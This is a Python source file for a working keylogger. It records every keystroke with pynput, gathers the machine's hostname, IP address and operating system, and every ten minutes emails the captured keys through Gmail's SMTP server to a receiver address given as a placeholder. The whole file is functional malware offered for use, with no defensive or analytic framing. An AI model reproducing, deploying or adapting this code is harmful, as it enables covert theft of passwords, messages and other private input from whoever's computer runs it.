from pynput import keyboard
from email.mime.text import MIMEText
from socket import gethostbyname, gethostname
from platform import system
import time
import smtplib

def key_pressed(key):
    global log_data
    if hasattr(key, 'char'):
        log_data += key.char
    else:
        log_data += key_names.get(key, '<unknown key>')

key_names = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '<enter>',
    keyboard.Key.backspace: '<backspace>',
    keyboard.Key.esc: '<esc>',
    keyboard.Key['f1']: '<F1>',
    keyboard.Key['f2']: '<F2>',
    keyboard.Key['f3']: '<F3>',
    keyboard.Key['f4']: '<F4>',
    keyboard.Key['f5']: '<F5>',
    keyboard.Key['f6']: '<F6>',
    keyboard.Key['f7']: '<F7>',
    keyboard.Key['f8']: '<F8>',
    keyboard.Key['f9']: '<F9>',
    keyboard.Key['f10']: '<F10>',
    keyboard.Key['f11']: '<F11>',
    keyboard.Key['f12']: '<F12>',
    keyboard.Key.shift: '<LShift>',
    keyboard.Key.shift_r: '<RShift>',
    keyboard.Key.ctrl: '<ctrl>',
    keyboard.Key.alt: '<alt>',
    keyboard.Key.caps_lock: '<caps>',
    keyboard.Key.cmd: '<cmd>',
    keyboard.Key.up: '<up>',
    keyboard.Key.down: '<down>',
    keyboard.Key.left: '<left>',
    keyboard.Key.right: '<right>',
    keyboard.Key.insert: '<insert>',
    keyboard.Key.home: '<home>',
    keyboard.Key.page_up: '<PgUp>',
    keyboard.Key.page_down: '<PgDn>',
    keyboard.Key.delete: '<del>',
    keyboard.Key.end: '<end>',
    keyboard.Key.print_screen: '<PrntScr>',
    keyboard.Key.scroll_lock: '<ScrLk>',
    keyboard.Key.pause: '<pause>',
    keyboard.Key.num_lock: '<NumLk>',
    keyboard.Key.tab: '<tab>',
}

hostname = gethostname()
ip = gethostbyname(hostname) 
os = system()

log_data = ''
last_print = time.time()

def send_email_with_keys(keys):
    sender_email = "senderGmailHere@gmail.com"
    receiver_email = "receiverGmailHere@gmail.com"
    password = "appPasswordHere"
    
    message = MIMEText(keys)
    subject = "Keylogger info from: "+ os +" "+ hostname +" ("+ip+")"
    content = keys
    message['subject'] = subject
    message['from'] = sender_email
    message['to'] = receiver_email
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.send_message(message)
    server.quit()

def send_logged_keys():
    global log_data
    if log_data:
        logged_keys = "Logged keys: " + log_data
        log_data = ""
        send_email_with_keys(logged_keys)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    while True:
        time.sleep(600) #Wait 10 minutes (600 seconds) before sending email, you can change that if you want.
        send_logged_keys()
